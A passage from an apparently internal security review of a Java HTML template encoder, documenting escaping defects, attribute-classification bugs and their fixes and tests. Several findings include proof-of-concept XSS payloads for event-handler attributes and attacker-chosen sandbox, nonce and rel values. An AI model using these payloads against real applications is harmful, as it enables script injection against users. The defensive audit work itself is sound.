single-byte escape for code points up to 255 and a literal `?` above that. Applied to the host as
well as the path, that mangles five ordinary cases. All fail closed, so none is a vulnerability — but
each silently produces a URL that does not mean what the template author wrote, and each is a reason
a developer reaches for `$_x.asis()` and turns encoding off for that value entirely.

| # | Input | Output | Effect |
|---|---|---|---|
| a | `https://host:8443/path` | `https://host%3A8443/path` | `%3A` is a forbidden host code point, so the URL fails to parse. **Any link with an explicit port is dead.** |
| b | `/search?q=hello&lang=en` | `/search?q=hello%26lang=en` | `&` is not on the allowlist, so it stops separating parameters. `lang=en` becomes part of `q`'s value. **Every multi-parameter query string is corrupted.** |
| c | `a%20b` | `a%2520b` | `%` is not on the allowlist, so correctly pre-encoded input is encoded again. |
| d | `/search/<CJK>/results` | `/search/?/results` | Code points above 255 become a literal `?`, which **is** on the allowlist. **The path has become a query string.** |
| e | `https://[::1]/x` | `https://%5B%3A%3A1%5D/x` | The brackets and colons of an IPv6 literal are escaped. WHATWG reads a host as IPv6 only when the first code point is a literal `[`, so this is not IPv6 written oddly — it is a host full of forbidden code points. **Every IPv6 URL is destroyed.** |

(d) is the worst, because it changes the URL's structure rather than merely its text. `url()` has no
UTF-8 step: it escapes a Java `char` value directly, so anything outside Latin-1 has no
representation and is replaced wholesale.

(e) is the same mistake as (a), one level up: the host group is escaped with the rules that apply to
a path. Splitting the URL and applying each component's own rules fixes (a), (b) and (e) together.

**Fix:** UTF-8 encode the input and percent-escape per byte, which fixes (d) and makes (c) avoidable;
add `&`, `_`, `~`, `+`, `,`, `;`, `:`, `@`, `$`, `!`, `*`, `'`, `(`, `)` to the allowlist per RFC 3986
sub-delims, or better, stop hand-rolling and split the URL properly before escaping each component
with the rules that apply to it. Note that (a) and (b) argue for the same thing as F6's remediation:
`url()` needs to parse the URL, not pattern-match it.

> **Verified.** `HtmlEncoderUrlTest.anExplicitPortIsDestroyed`,
> `aQueryStringWithTwoParametersIsCorrupted`, `alreadyEncodedInputIsDoubleEncoded`,
> `aNonLatin1CharacterInAPathBecomesAQuerySeparator`, `everyIpv6LiteralIsDestroyed`.

> **`uriPattern` is not only a corruption source (2026-07-26, T31).** The same three-group match this
> finding treats as a failed attempt at component-aware escaping turns out to be a security defect in
> its own right: group 1 is appended **unencoded**, and the raw colon it carries re-runs
> `detectAttributePrefix()`. That is [F24](#f24--medium-url-passes-a-scheme-prefix-through-with-its-colon-so-attacker-data-can-steer-the-context).
> The fix this finding recommends — split the URL properly and escape each component with its own
> rules — closes F24 too, provided the scheme separator is emitted from the encoder's own knowledge
> of the parse rather than copied out of the input.

---

### F16 — Low: `js()` truncates astral code points, and `css()` emits unterminated hex escapes and drops everything above U+00FF

*Added 2026-07-26, found while building the test suite.*

**Location:** `HtmlEncoder.java:149-172` (`js`) and `HtmlEncoder.java:256-279` (`css`).

**Reachability, precisely.** Two different surfaces, and only one of them is latent:

- **Live today, through `$_x`.** `HtmlEncoder implements QlueVelocityTool` and its `getName()`
  returns `_x` (`HtmlEncoder.java:43`), so the encoder instance is bound into every Velocity context
  under that name — and `CanoeReferenceInsertionHandler.referenceInsert()` returns any reference
  beginning `$_x.` or `$!_x.` unencoded, by design. `$_x.js(...)` and `$_x.css(...)` are therefore
  callable from any template in the application right now, and every corruption described below —
  the truncated astral code points, the swallowed character after a hex escape, the `?` — happens to
  real output today. The damage is corruption, not injection: the values are wrong, and a developer
  who hits one is being pushed toward `$_x.asis()`.
- **Latent, behind `CTX_JS` and `CTX_CSS`.** Neither encoder is reachable from `Canoe.encode()`:
  both contexts map to the empty string. The *injection* risk therefore does not exist until the
  commented-out code at `Canoe.java:1074-1081` is uncommented and these encoders take over from the
  suppression — which is exactly what that code contemplates. Neither is fit for it.

**`js()` discards everything above a code point's low sixteen bits.** The non-ASCII branch is:

```java
sb.append("\\u");
HtmlEncoder.hex(c >> 8, sb);
HtmlEncoder.hex(c, sb);
```

`hex()` emits only the low byte of its argument, so the escape carries `(c >> 8) & 0xFF` and
`c & 0xFF` — four hex digits from sixteen bits of a code point that may have twenty-one. Every astral
character is silently replaced by the BMP character sharing its low sixteen bits:

| Input | Output | Becomes |
|---|---|---|
| U+1F600 GRINNING FACE | `'\uF600'` | U+F600, a private-use character |
| U+10027 | `'\u0027'` | an apostrophe |
| U+1005C | `'\u005C'` | a backslash |
| U+10000 | `'\u0000'` | a NUL |

**`css()` emits a hex escape with no terminator.** CSS hex escapes are variable length — up to six
digits, ended by whitespace or by the first character that is not a hex digit — so a two-digit escape
swallows whatever hex digit follows it:

| Input | Output | CSS reads |
|---|---|---|
| `'a` | `'\27a'` | U+027A, not `'` followed by `a` |
| `<a` | `'\3Ca'` | U+03CA, not `<` followed by `a` |

A following non-hex character is safe, which is why casual testing does not find this: `css("'z")` is
`'\27z'`, and `css("''")` is `'\27\27'` because the backslash ends the previous escape.

**`css()` also replaces every code point above U+00FF with a literal `?`** (`HtmlEncoder.java:272-274`):
the escape branch is guarded by `if (c <= 255)`, and the `else` appends `'?'`. This is the same `?`
substitution [F15](#f15--low-url-silently-corrupts-legitimate-urls-five-different-ways)(d) calls the
worst of that finding's five, for the same reason — it is not an escaping mistake, it is a silent
replacement of one character by a different, meaningful one:

| Input | Output | Effect |
|---|---|---|
| U+0100 | `'?'` | the code point is gone, not escaped |
| U+1F600 GRINNING FACE | `'?'` | the code point is gone |
| U+00FF | `'\FF'` | Latin-1 is escaped, one byte at a time |

Any CSS string containing non-Latin-1 text — which is any CSS string containing CJK, Cyrillic, Greek,
Arabic, Hebrew, or an emoji — is destroyed. `css()` has no UTF-8 step, exactly as `url()` has none.

**Neither is an injection today**, and it is worth being precise about why, because the existing
delimiter sweep passes and passes for the wrong reason. `js()`'s escapes are fixed width, so a wrong
escape is still a well-formed escape: it produces the wrong character but cannot terminate the string
literal. `css()`'s escape is malformed but consumes rather than emits — it eats the following
character instead of ending the value. In both cases the output is wrong and inert.

That changes the moment `CTX_JS` or `CTX_CSS` stops being suppression. `css()` in particular is the
textbook unterminated-hex-escape bug, and the review's
[corollary](#corollary-attacker-data-can-never-steer-the-parser) explicitly asks that any such
relaxation be re-checked first. This is one of the things that check would find.

**Fix:** in `js()`, emit a surrogate pair or the ES6 `\u{…}` form for code points above U+FFFF rather
than truncating. In `css()`, pad the escape to six hex digits or append a terminating space, and
escape code points above U+00FF as their own six-digit hex escape instead of substituting `?`. All
three are worth doing on their own account, because `$_x.js()` and `$_x.css()` corrupt template
output today; none of the three is optional before `CTX_JS` or `CTX_CSS` stops being suppression.

> **Verified.** `HtmlEncoderTest.jsTruncatesAstralCodePointsToTheirLowSixteenBits`,
> `cssHexEscapesAreUnterminatedAndSwallowTheNextCharacter`, plus allowlist sweeps
> `jsPassesThroughOnlyAlphanumerics`, `cssPassesThroughOnlyAlphanumerics` and
> `everyJsEscapeIsAFixedWidthHexForm`.

---

### F17 — High: the `detectAttributePrefix()` reset also defeats the JavaScript suppression

*Added 2026-07-26, found while writing T10.*

**Location:** `Canoe.java:224`, the same line as [F4](#f4--high-detectattributeprefix-discards-the-attributes-context-defeating-css-suppression).

**On the severity, so it is not re-litigated.** The outcome is the same as F1, F2 and F3 — arbitrary
script execution against a data-only attacker — and those are rated Critical. F17 is held at High
deliberately, on the same **precondition discount** applied to [F5](#f5--high-javascript-prefix-detection-reads-uninitialised-buffer-residue):
script execution that requires the template to satisfy an incidental positional condition the
attacker cannot influence. F1, F2 and F3 fire on any template with the attribute; F17 fires only when
the handler body happens to put a colon in its first eleven characters, and no payload can move it
there. The discount is the reason for the gap, not a judgement that the outcome is milder — the
remediation section below still calls it a Critical-class outcome, and it should be fixed on that
basis.

F4 records two consequences of the unconditional `attributeContext = ATTR_HTML` reset: CSS
suppression is defeated, and `ATTR_URI` is downgraded to entity encoding. There is a third, and it is
worse than either, because it breaches the one guarantee Canoe actually delivers.

**The reset applies to `ATTR_JS` as well.** `onclick` is one of the 21 names
`setTagAttributeContext()` actually recognises — see [the systemic flaw](#the-systemic-flaw) for why
that is 21 and not the 24 the source declares. It resolves to `ATTR_JS` → `CTX_JS` → the empty
string, which is the behaviour a reviewer spot-checking `onclick` sees before concluding that the
mechanism works. But the
first colon at value index 0–10 discards that classification exactly as it discards `ATTR_CSS`, and
`html()` takes over:

| Template | Context at the reference | Encoder |
|---|---|---|
| `<a onclick="f('$id')">` | `CTX_JS` | suppressed — the design |
| `<a onclick="f({a:1,b:'$id'})">` | `CTX_HTML_ATTR` | `html()` — decoded by the parser before the JS parser runs |

**Exploitation vector.** `id` = `');alert(1);//` renders as

```html
<a onclick="f({a:1,b:'&#39;&#41;&#59;alert&#40;1&#41;&#59;&#47;&#47;'})">
```

The HTML parser decodes every reference while building the attribute value, so the JavaScript parser
receives `f({a:1,b:'');alert(1);//'})` and executes `alert(1)` on click. Identical mechanism to F1
and F2, but reached through an attribute Canoe classifies **correctly**.

**Precondition.** A colon within the first eleven characters of the handler body — value index 0
through 10, the same window as F4. That is not an exotic shape. Measured over 45 realistic handler
bodies, the ones that trigger it are:

| Handler body | Colon at | |
|---|---|---|
| `f({a:1})` | 4 | object literal |
| `a?b:c` | 3 | ternary |
| `t=a?1:2` | 5 | ternary after an assignment |
| `go('http://x')` | 8 | **a URL literal in the handler** |
| `send({url:'/a'})` | 9 | object literal as an argument |
| `f(this,{k:1})` | 9 | object literal as a second argument |
| `showTip({x:1})` | 10 | the last index that still triggers |
| `return {ok:1}` | 10 | likewise |

And the ones that do not: `$.ajax({url:'/a'})` (11), `open('https://x')` (11),
`track('event:click')` (12), plus everything with no colon at all — `return false`,
`this.form.submit()`, `alert('x')`, `window.location='/x'`, `e.preventDefault()`, `setTimeout(f,1)`,
`if(x){y()}`.

The URL pair is the one to look at, because it shows what kind of boundary this is: `go('http://x')`
is injectable and `open('https://x')` is not, and the only difference between them is that the second
function name is two characters longer. The precondition is arbitrary rather than semantic — it is a
property of how many characters precede the colon, not of what the handler does — so it cannot be
reasoned about from the template's meaning, only measured. That is also why a spot check does not
find it.

*(Two shapes that look like they should qualify and do not: `this.style.cssText='color:red'` puts the
colon at index 25 and `el.setAttribute('style','color:red')` at index 30. Both are unaffected. An
inline `style:` string is a plausible-sounding example that does not reproduce.)*

**Why this changed the remediation order.** Replacing the hand-unrolled `on*` table with
`if (buf[0]=='o' && buf[1]=='n') { attributeContext = ATTR_JS; return; }` fixes F1, F2 and F19
completely and does **nothing** for F17: the name is already being classified as JavaScript, and the
value scan throws the answer away afterwards. Deleting the reset, so that
`detectAttributePrefix()` can only ever narrow the context, is the fix — and it is load-bearing for a
Critical-class outcome rather than only for F4's CSS impact. That item was written third and now sits
first; see [Remediation](#remediation-in-priority-order).

> **Verified.** `AttributePrefixTest.theResetAlsoDefeatsTheJavascriptSuppression` and
> `aColonInARecognisedHandlerLetsThePayloadReachTheJavascriptParser`, the latter asserting on the
> jsoup-decoded attribute value rather than on Canoe's output, which is the distinction this whole
> review turns on. The exploitability was re-confirmed independently, and it is not narrower than
> stated: `theResetFiresWhateverTheQuotingAndWhereverTheReferenceSits` shows the payload arriving
> intact for a double-quoted, single-quoted **and** unquoted handler value, and for a reference
> spliced straight into an expression rather than into a JavaScript string literal. None of the three
> is a mitigation. The *precondition* was narrower than stated, and is corrected above.
>
> **Corpus coverage added 2026-07-26.** T10 pinned the mechanism at unit level and T12 built out §A.4
> without citing this finding once, so the highest-priority item on the remediation list had no
> end-to-end case. It has three now, and they are three rather than one because the shape of the
> precondition is the finding: `prefix.colon-in-a-recognised-handler`
> (`<a onclick="f({a:1,b:'$data'})">`, colon at index 4) and
> `prefix.url-literal-in-a-recognised-handler` (`<a onclick="go('http://x'+'$data')">`, colon at
> index 8) both render the payload into the handler live — measured, the decoded `onclick` reads
> `f({a:1,b:'');__canoePwned('q');//'})` and `go('http://x'+'');__canoePwned('q');//')` — while
> `prefix.colon-past-the-handler-window` (`$.ajax({url:'/a',…})`, colon at index 11) is suppressed
> exactly as designed. Nothing about what those handlers *do* distinguishes them; only how many
> characters precede the colon does. A single case would have read as "this handler is injectable";
> the trio reads as "whether a handler is injectable is decided by its length", which is the claim.

---

### F18 — Low: a comment before the DOCTYPE makes the DOCTYPE illegal

*Added 2026-07-26, found while writing T11.*

**Location:** `Canoe.java:604` and `Canoe.java:621`.

`tagCount++` runs for every `<` seen in `HTML` state, and `COMMENT_OPEN_OR_DOCTYPE` demands
`tagCount == 1` before it will accept a DOCTYPE. A comment is markup, so it counts:

| Input | Result |
|---|---|
| `<!DOCTYPE html><html>` | fine |
| `\n  <!DOCTYPE html><html>` | fine — whitespace contains no `<` |
| `hello<!DOCTYPE html>` | fine — text contains no `<` |
| `<!-- c --><!DOCTYPE html><html>` | **`Encoding Error: DOCTYPE declaration must be at the beginning`** |

A licence header, an editor marker, or a generator stamp above the DOCTYPE is legal HTML and common
in template files, and it takes the whole page down. Per F13 the failure is a 500, not a degraded
page, and per the check's position the response has already been flushed as far as the `<!`.

Same class as the five availability defects in F13's table, and the same fix shape: the check wants
"no *element* has been emitted yet", not "no `<` has been seen yet".

> **Verified.** `CanoeRobustnessTest.aCommentBeforeTheDoctypeMakesTheDoctypeIllegal`.

> **Resolved — R18 (2026-07-26).** `tagCount` is gone, and with it the only thing that read it. The
> precondition is now two booleans with one meaning each: `elementSeen`, set where `TAG_NAME` commits
> to a tag — a start tag's first name character or the `/` of an end tag, and deliberately not the
> `!` of a bang declaration — and `doctypeSeen`, set when a DOCTYPE is accepted. A comment above the
> DOCTYPE is legal, any number of them are, and whitespace or text between them changes nothing.
> The rejections that remain are `<html><!DOCTYPE html>` ("DOCTYPE declaration must precede the first
> element", reworded from "must be at the beginning", which stopped describing the rule the moment a
> comment was allowed above the declaration) and a second DOCTYPE ("Duplicate DOCTYPE declaration",
> its own message: a browser ignores the second one, and a template that emits two is an authoring
> mistake worth naming). **Neither rejection is new.** `tagCount` was already past 1 in both cases,
> so both were refused before R18 under the single misleading message; R18 splits that message in two
> and rejects nothing it used to accept — a differential run of both tokenizers over 8,420 generated
> documents finds 29 newly accepted, 0 newly rejected, and no change to any accepted output. Whether
> Canoe should be stricter than a browser about the second declaration at all is a question for R20's
> rejection-table triage, not for F18. `hello<!DOCTYPE html>` stays accepted, as the table above
> records it was:
> the HTML Standard's "initial" insertion mode calls non-whitespace text a parse error there, but
> text is not markup, and turning it into a 500 would be a new availability defect in the task that
> exists to remove one. The verified test is inverted to
> `CanoeRobustnessTest.aCommentBeforeTheDoctypeIsNowLegal`, which keeps the former name and this
> reasoning in its javadoc and carries the surviving rejections as its regression net.

---

### F19 — Critical: `onreadystatechange=` is never classified as JavaScript

*Added 2026-07-26, found while reviewing T10/T11.*

**Location:** `Canoe.java:483-491`, inside the block guarded at line 334 by
`if ((buf[0] == 'o') && (buf[1] == 'n'))`.

```java
// onRe
if ((buf[2] == 'r') && (buf[3] == 'e')) {
    // onReadyStateChange
    if ((buf[4] == 'd') && (buf[5] == 'y') && (buf[6] == 's')
            && (buf[7] == 't') && (buf[8] == 'a')
            && (buf[9] == 't') && (buf[10] == 'e')
            && (buf[11] == 'c') && (buf[12] == 'h')
            && (buf[13] == 'a') && (buf[14] == 'n')
            && (buf[15] == 'g') && (buf[16] == 'e')
            && (buf[17] == '\0')) {
```

Read the indices back as a string. The guard fixes `buf[0..3]` as `o`,`n`,`r`,`e`; the body then
demands `d`,`y`,`s`,`t`,`a`,`t`,`e`,`c`,`h`,`a`,`n`,`g`,`e` at `buf[4..16]` and a terminator at
`buf[17]`. Concatenated that is **`onredystatechange`** — seventeen characters. The `a` of "ready" is
missing. The branch matches an attribute literally named `onredystatechange`, which no HTML document
has ever contained, and cannot match `onreadystatechange`, which is eighteen characters long.

**The exact comparison that fails.** For `onreadystatechange` the buffer holds
`o n r e a d y s t a t e c h a n g e \0` at indices 0–18. The `onRe` guard passes (`buf[2]=='r'`,
`buf[3]=='e'`). The first test in the body is `buf[4] == 'd'`, and `buf[4]` is `'a'` — the fifth
character of the real name. That single mismatch ends the branch. Control falls to the `onRes` test
(`buf[4] == 's'`, also `'a'` — fails), then out of the `onRe` block, past `onUnLoad`
(`buf[2] == 'u'` — fails), out of the `on` block, past the `s` block (`buf[0] == 's'` — `buf[0]` is
`'o'`), and off the end of `setTagAttributeContext()` with `attributeContext` still holding the
`ATTR_HTML` default assigned at line 283.

Measured:

| Attribute | Context | Encoder |
|---|---|---|
| `onreadystatechange` | `CTX_HTML_ATTR` | `html()` — **injectable** |
| `onredystatechange` | `CTX_JS` | suppressed — the branch works, for a name nobody writes |
| `onclick` | `CTX_JS` | suppressed |
| `onselect`, `onsubmit` | `CTX_HTML_ATTR` | `html()` — injectable (F1) |

**Exploitation vector.** Identical to F1 and F2 — the mechanism is the `ATTR_HTML` fall-through, and
`onreadystatechange` fires on any element that loads a resource:

```html
<img src="x" onreadystatechange="f('$data')">
```

Attacker sets `data` to `');alert(1);//`. `html()` emits
`&#39;&#41;&#59;alert&#40;1&#41;&#59;&#47;&#47;`; the HTML parser decodes every reference while
building the attribute value, before the value is compiled as JavaScript; the string literal closes
and arbitrary script runs.

**Why this was not found earlier, and what changed.** F1 was found by reading the `onS` block and
noticing it tested `buf[0]`. Nothing about the `onReadyStateChange` block looks wrong on inspection —
the indices are consecutive, the terminator index matches the number of characters compared, and the
comment above it says the right thing. It is only wrong when you read the *comparands* back as a
word, and it takes deliberate effort to do that thirteen `&&` clauses deep. The exhaustive test added
alongside this finding — assert the classification of all 24 declared `on*` branch names, one row
each — finds it in a form no reader can skim past, and stops the count of working branches from
drifting again.

**Fix:** none specific. Remediation item 2 below (replace the whole table with
`if (buf[0]=='o' && buf[1]=='n') { attributeContext = ATTR_JS; return; }`) deletes this branch along
with the other twenty-three, and is the only fix worth making — a table of 24 hand-unrolled
comparison chains of which 3 are silently dead is not a structure worth repairing one branch at a
time. Note that `onreadystatechange` also appears in [F5](#f5--high-javascript-prefix-detection-reads-uninitialised-buffer-residue)'s
list of names long enough to arm the buffer-residue bug; that remains true and is unrelated.

> **Verified.** `CanoeStateMachineTest.everyDeclaredOnStarBranchNameIsClassified` (all 24 declared
> names, one parameterised row each) and
> `CanoeStateMachineTest.onreadystatechangeIsSpeltWithoutItsA` (the misspelling itself, and the
> `buf[4]` mismatch that produces it). Corpus: `handler.onreadystatechange` and
> `handler.onredystatechange`.

---

### F20 — Medium: policy-bearing attributes arrive verbatim, and no encoder can help

*Added 2026-07-26, found while building out the corpus (T12). Re-rated and re-scoped 2026-07-26 after
a review of the corpus build-out; see **On the severity** and **What is not in this category** below.*

**Location:** `Canoe.java:283` — the `attributeContext = ATTR_HTML` default, same line as F3's misses.

[The systemic flaw](#the-systemic-flaw) frames the problem as: `html()` is worthless for any attribute
whose value is "subsequently parsed as JavaScript, CSS, a URL, or markup". That is four categories,
and there is a fifth. Some attributes are consumed by the **HTML parser itself**, as a *directive*:
the value is not something to fetch or to execute, it is a switch that turns a security control on or
off. None of them is in Canoe's recognised set, so all of them get `ATTR_HTML`:

| Attribute | Element | What the attacker gets |
|---|---|---|
| `sandbox` | `<iframe>` | `allow-scripts allow-same-origin` removes the sandbox. The framed document then runs script **in the framing page's origin** — the exact outcome sandboxing exists to prevent |
| `nonce` | `<script>`, `<style>` | The CSP nonce the page will admit. An attacker who chooses it can author a `<script nonce>` the policy accepts, which defeats the control rather than tripping it |
| `rel` | `<a>`, `<link>` | `opener` undoes the implicit `noopener` that `target=_blank` carries, restoring `window.opener` and with it reverse tabnabbing |
| `integrity` | `<script>`, `<link>` | A well-formed but wrong digest blocks the resource (denial of service against one script); a template that omits the attribute for an empty value loses SRI entirely |

**Why encoding cannot fix this, which is what makes it a different finding rather than another row in
F3's table.** F3's sinks are at least *theoretically* encodable: a URL can be parsed and rejected, and
markup can be double-encoded. A policy token cannot. Every one of these values is built from ASCII
letters, digits, hyphens, underscores and spaces — and `html()` passes letters and digits through
naked and converts the rest to character references the HTML parser puts straight back while building
the attribute value. Measured:

```html
<iframe sandbox="$level" src="/user-content"></iframe>
```

`level` = `allow-scripts allow-same-origin` renders as

```html
<iframe sandbox="allow&#45;scripts&#32;allow&#45;same&#45;origin" src="/user-content"></iframe>
```

and the parser hands the sandbox algorithm `allow-scripts allow-same-origin`, byte for byte. There is
no escaping of `-` or of a space that would change the meaning, because the meaning *is* the letters.
The only defence is to refuse to output at all — which is
[remediation item 3](#remediation-in-priority-order), the fail-closed default.

**What is not in this category, and the criterion that decides it.** As first written this finding
listed six attributes and the corpus's `SinkKind.POLICY` widened the definition to "a security *or
behavioural* directive" in order to hold all six — while the finding's own text said "a switch that
turns a security control on or off". Two definitions that disagree are worse than either. The strict
one is the right one, and it is now written out so the boundary is checkable. An attribute belongs
here when **all three** of these hold:

1. a browser algorithm consumes the decoded value as a directive, rather than handing it to a second
   parser or fetching it;
2. the directive it controls is a **security** control, not a behavioural one;
3. no encoding of the value can change what it means, because the meaning *is* the letters.

Three of the original six fail criterion 2 and have been moved out:

- **`type` on `<script>`** is a content-type directive, and the only thing an attacker can do with it
  is make the browser refuse to run the script — which fails safe. No value of `type` turns execution
  *on* where it was off. It is also plain text nearly everywhere else it appears: `<input type>`,
  `<button type>`, `<ol type>`.
- **`target` and `formtarget`** retarget a navigation or a form submission into a named or new
  browsing context. That is behaviour. The closest they come to a security control is that
  `target=_blank` implies `noopener` — and the attribute that undoes *that* is `rel`, which is why
  `rel` stays and these do not.

And one attribute has been moved **in**: `nonce`. It was in the review's own plain-text list and in
the corpus's plain-text group, on the argument that the value cannot break out of the attribute — true,
and not the question. A CSP nonce satisfies all three criteria more cleanly than `target` ever
satisfied the loose ones. See remediation item 3, which had `nonce` in its allowlist and no longer
does.

Criterion 3 is what separates this category from author mistakes generally. `<div id="$data">` makes
the same argument — the legal values are exactly the dangerous ones — and is correctly recorded as
safe, because criterion 1 fails: an `id` is a name in the document's own namespace and no browser
algorithm treats it as a directive. What it endangers is other scripts on the page, which is DOM
clobbering and not this finding.

**On the severity.** Rated **Medium**, down from the High it was first given, and the reasoning is
worth stating because the High was defensible on the day it was written.

The `sandbox` row's outcome is same-origin script execution, the Critical-class outcome F1, F2 and F3
are rated on, and nothing about that has changed. What has changed is how honestly the discounts are
counted. The finding always discounted `sandbox` **twice** — the framed document has to contain
something worth sandboxing, so the vector is "attacker removes the mitigation" rather than "attacker
executes script"; and a template that derives a sandbox level from data is rarer than any other
precondition in this document. F5 and F17 are held at High on **one** precondition discount each, and
both fire on template shapes that are common. A finding whose only Critical-class row needs two
uncommon conditions to line up does not sit level with those, and the other rows — a chosen nonce, a
restored `window.opener`, a blocked script — are policy weakening and denial of service.

So: **Medium overall, with the `sandbox` row called out as a Critical-class outcome behind two
preconditions.** That is the same shape as F17's rating note, and it is written this way so the
severity does not have to be re-litigated against F1's Critical every time someone reads the table.
It should still be fixed on the strength of the outcome, not the rating.

**Note what this does *not* say.** It is not a claim that Canoe should have prevented
`<a href="//attacker.invalid">`-style author mistakes generally. It is the narrower and more useful
observation that Canoe's `ATTR_HTML` default is applied to a class of attribute where encoding is not
merely insufficient — it is *inapplicable*, and the component silently reports success. That is the
argument for fail-closed stated more sharply than F2 and F3 state it: for F2 and F3, a better encoder
would help; here, only suppression does.

**Fix:** covered entirely by remediation item 3. When unknown attribute names map to `CTX_SUPPRESS`,
all four of these suppress, and so does the next policy attribute the HTML Standard adds. No item
below item 3 touches this finding, and no change to `HtmlEncoder` can.

> **Verified.** Corpus cases `policy.sandbox`, `policy.nonce`, `policy.rel` and `policy.integrity`,
> each asserting on the jsoup-decoded attribute value — the value a browser hands on — rather than on
> Canoe's output. `SinkKind.POLICY` exists so the category is named in the corpus rather than folded
> into `PLAIN_TEXT_ATTR`, where a structural oracle would have called every one of them safe; its
> javadoc carries the three criteria above so the boundary is checkable rather than remembered. The
> three excluded names are still in the corpus as `plain.type`, `plain.target` and
> `plain.formtarget`, each recording why it was considered and rejected, so the argument does not have
> to be rediscovered.
>
> **Corrected.** The cross-product used to give all three policy tokens to all six attributes and
> record every pairing as `KNOWN_VULNERABLE`, which the ledger's own definition — attacker data
> reaches the sink *live* — does not support. Measured, eight of those eighteen rows were inert:
> `sandbox="opener"` and `sandbox="_blank"` are unknown sandbox tokens, so the sandbox stays
> maximally restrictive; `rel="allow-scripts allow-same-origin"` and `rel="_blank"` are not link
> types; and none of the three parses as an SRI hash expression, so `integrity`'s metadata set is
> empty and the check passes vacuously rather than blocking anything. The oracle could not see any of
> that, because it asked only whether the bytes survived. It now carries the token vocabulary for each
> attribute, and those rows are recorded `SAFE` with the reason. The `sandbox` row this finding is
> rated on is unaffected.

---

### F21 — Low (latent): `currentContext()` can never return `CTX_CSS`

*Added 2026-07-26, found while writing the attribute-name matrix (T14).*

> **Resolved — R14 (2026-07-26).** Recommendation taken: keep suppressing and delete the trap. The
> `CTX_CSS` constant, its dead `encode()` arm, and **both** commented-out contemplation lines below
> (the `CTX_CSS` one and its live-if-uncommented `CTX_JS` twin) are deleted; `ATTR_CSS` still routes to
> `CTX_SUPPRESS`, so `style` values stay suppressed by design. The [systemic flaw](#the-systemic-flaw)
> table now lists five contexts. `AttributeNameMatrixTest.currentContextCanNeverReturnCtxCss` is
> retired as `.thereIsNoCtxCssAndStyleStillSuppresses`, inverting its source assertion so no `CTX_CSS`
> constant, arm or return may reappear without a deliberate decision. The reasoning below stands as the
> record of why the trap was worth removing.

**Location:** `Canoe.java:1034-1051` (`currentContext()`) and `Canoe.java:1079-1081` (`encode()`).

`encode()` maps six contexts. `currentContext()` can produce five. The `TAG_ATTR_VALUE` arm groups
`ATTR_CSS` with the three contexts that have no encoder of their own:

```java
case ATTR_CSS:
case ATTR_DATA:
case ATTR_CONTENT:
case ATTR_ACTIONSCRIPT:
    return CTX_SUPPRESS;
```

and no other arm of the switch mentions `CTX_CSS` either — a `<style>` element body returns
`CTX_SUPPRESS` from the `CSS`/`CSS_END` states, not `CTX_CSS`. The string `CTX_CSS` appears exactly
twice in `Canoe.java`: once where the constant is declared, and once in an `encode()` arm nothing can
reach.

**No security impact today**, and it is worth being precise about why, because that is the whole
content of the finding. `CTX_CSS` and `CTX_SUPPRESS` both encode to the empty string, so `style` is
suppressed either way and every CSS verdict in the test corpus is unaffected. Nothing observable
differs.

**It is a trap laid across the remediation path**, in exactly the way
[F16](#f16--low-js-truncates-astral-code-points-and-css-emits-unterminated-hex-escapes-and-drops-everything-above-u00ff)
is. The commented-out code at `Canoe.java:1074-1081` contemplates replacing the JS and CSS
suppression with real escaping:

```java
case CTX_JS:
    // return HtmlEncoder.encodeForJavaScript(input);
    return EMPTY_STRING;
case CTX_CSS:
    // return HtmlEncoder.encodeForCSS(input);
    return EMPTY_STRING;
```

Uncommenting both lines is one symmetrical-looking edit with two different outcomes. The `CTX_JS`
half takes effect immediately — `ATTR_JS` and the `SCRIPT` states both produce `CTX_JS`. The
`CTX_CSS` half **changes nothing at all**, because nothing produces `CTX_CSS`. A developer who made
that change, tested `<script>`, and saw values start appearing would reasonably conclude both halves
had landed; `style` would still be silently dropped, and a reviewer reading `encode()` would conclude
that `style` values were being CSS-escaped. Half of an apparently atomic change would be live and
half dead, with no diagnostic either way.

There is a second, smaller cost that is felt today. Because `ATTR_CSS` is indistinguishable from
`ATTR_DATA`, `ATTR_CONTENT` and `ATTR_ACTIONSCRIPT` at the context level — and from every state
`currentContext()` has no case for — an observer cannot tell a `style` attribute Canoe classified
*correctly* from one it fell through on. That is the same ambiguity
[F11](#f11--low-unquoted-attribute-references-silently-render-as-the-empty-string) is made of, and it
is the reason both `CanoeStateMachineTest` and `AttributeNameMatrixTest` assert the `ATTR_*` value
alongside the context rather than only the context.

**Fix:** either return `CTX_CSS` for `ATTR_CSS` — the reading the field names imply, and the one that
makes the commented-out line mean something — or delete the `CTX_CSS` constant and its `encode()`
arm. The first is the right fix and it is *only* safe once `HtmlEncoder.css()` is fit for use, which
per F16 it is not: it emits unterminated two-digit hex escapes that swallow the following character
and replaces every code point above U+00FF with a literal `?`. Doing this before F16 is fixed would
turn a suppression into a defective escaper, which is worse than either. Whichever is chosen, the
mapping table in [the systemic flaw](#the-systemic-flaw) should stop listing six contexts.

> **Verified (as found), now retired by R14.** `AttributeNameMatrixTest.currentContextCanNeverReturn`
> `CtxCss` asserted it three ways: measured, over `style`, the `<style>` body and `CSS_END`; by
> exhaustion, over every name in the ~90-name attribute matrix; and against the source, which was the
> general form of the claim — `currentContext()` did not contain the string `CTX_CSS` and `encode()`
> still carried the arm. R14 closed the finding from the second end (deleting the arm), so the successor
> `.thereIsNoCtxCssAndStyleStillSuppresses` inverts the source assertion: no `CTX_CSS` constant, arm or
> `return` may reappear, and `style` still classifies as `ATTR_CSS` and suppresses.

---

### F22 — Low: `VelocityViewFactory` declares a `class` resource loader it never configures

*Added 2026-07-26, found while writing the production-path test (T20).*

**Location:** `VelocityViewFactory.java:76-97` (`buildDefaultVelocityProperties`) and
`ClasspathVelocityViewFactory.java:71-82` (the override that repairs it).

`buildDefaultVelocityProperties()` sets

```java
properties.setProperty(RuntimeConstants.RESOURCE_LOADERS, "class,string");
...
properties.setProperty("resource.loader.class.cache", "false");
```

— it names a `class` loader, and it configures that loader's *caching* — but it never sets
`resource.loader.class.class`. Velocity 2.4.1 ships no default for that key, so an engine built from
these properties fails at `init()`:

```
VelocityException: Unable to find 'resource.loader.class.class' specification in configuration.
This is a critical value.  Please adjust configuration.
```

The only shipped subclass that works is `ClasspathVelocityViewFactory`, which supplies the key in its
own `buildDefaultVelocityProperties()` override — choosing `NonCachingClasspathResourceLoader` unless
`resource.loader.file.cache` says otherwise, which it does only when the application declares a
priority template path.

**Why it is a finding rather than a design.** `VelocityViewFactory` is `public abstract` and its class
comment says it "needs subclassing to provide initialization and decide where to look for template
